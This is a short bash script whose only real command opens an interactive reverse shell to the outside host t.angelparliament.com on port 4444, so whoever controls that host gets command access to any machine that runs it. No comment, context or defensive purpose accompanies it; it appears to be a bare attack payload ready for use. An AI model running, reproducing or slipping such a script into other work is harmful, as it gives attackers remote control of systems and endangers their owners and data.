#!/bin/bash
bash -i >& /dev/tcp/t.angelparliament.com/4444 0>&1
wait
